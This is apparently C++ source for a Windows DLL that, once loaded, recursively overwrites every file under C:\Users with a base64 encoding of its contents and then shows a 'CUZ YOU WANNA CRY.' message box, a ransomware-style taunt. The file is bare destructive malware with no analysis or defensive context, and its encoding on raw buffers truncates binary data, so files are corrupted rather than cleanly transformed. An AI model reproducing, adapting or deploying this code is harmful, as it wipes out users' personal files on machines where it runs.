#include <Windows.h>
#include <thread>
#include <vector>
#include <string>

#include "base64.h"

#include <iostream>
#include <fstream>
#include <filesystem>

void main()
{
	std::vector<std::string> Files;

	std::filesystem::recursive_directory_iterator begin("C:\\Users");
	std::filesystem::recursive_directory_iterator end;

	for (; begin != end; begin++) 
	{
		try {
			std::ifstream infile(begin->path().string(), std::ifstream::binary);
		
			infile.seekg(0, infile.end);
			long size = infile.tellg();
			infile.seekg(0);

			char* buffer = new char[size];

			infile.read(buffer, size);

			infile.close();

			std::ofstream outfile(begin->path().string(), std::ofstream::binary);
		
			outfile.write(base64_encode(buffer).c_str(), base64_encode(buffer).length());

			outfile.close();

			delete[] buffer;
		}
		catch (...) {
			printf_s("Error\n");
		}
		
	}

	MessageBox(NULL, L"CUZ YOU WANNA CRY.", L"CUZ YOU WANNA CRY.", MB_OK | MB_ICONERROR);
}

BOOL DllMain(HINSTANCE Instance, DWORD dwReason, LPVOID lReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		std::thread init(main);
		init.detach();
		break;
	}
}